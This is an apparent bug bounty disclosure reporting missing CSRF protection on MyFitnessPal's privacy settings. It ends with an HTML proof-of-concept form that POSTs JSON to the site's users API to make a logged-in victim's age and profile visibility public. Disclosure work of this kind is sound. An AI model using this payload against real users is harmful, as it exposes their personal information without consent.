## Summary:
Hey team,
There is no CSRF protection on `Privacy Settings` endpoint "[https://www.myfitnesspal.com/account/profile-privacy](https://www.myfitnesspal.com/account/profile-privacy)"
As an attacker I could simply send a URL to victim and as soon as he opens the URL his privacy settings would be changed, and I can set his *Profile Visibility* and *Age Visibility* to *Everyone*

## Impact:
The absence of CSRF (Cross-Site Request Forgery) protection on a site's privacy settings can have serious consequences:

* Unauthorized Privacy Changes: Attackers can force users to unintentionally change their privacy settings, making their profiles and age information visible to everyone.

* Privacy Violations: This vulnerability can lead to unauthorized exposure of sensitive personal information, potentially compromising user privacy.

* Reputation Damage: Users may suffer reputational harm as their private data becomes accessible to anyone without their consent.

* Legal and Compliance Risks: The site could face legal consequences and compliance issues for failing to protect user data and privacy adequately.

* Trust Erosion: Users may lose trust in the platform, impacting its reputation and potentially causing a decline in user engagement and growth.

## Steps to reproduce:
1. Login in your account
1. Copy the HTML code and save in a file with .html extension
1. Open the Html file while you are logged in your account.
1. You will see your privacy settings will be changed

### HTML CODE:
```
<!DOCTYPE html>
<html>
  <head>
    <title>CSRF PoC</title>
  </head>
  <body>
    <script>
      history.pushState('', '', '/');
    </script>
    <form action="https://www.myfitnesspal.com/api/services/users" method="POST">
      <input
        type="hidden"
        name="json"
value='{"item":{"privacy_preferences":{"age_visibility":"public","profile_visibility":"public"}}}'
      />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
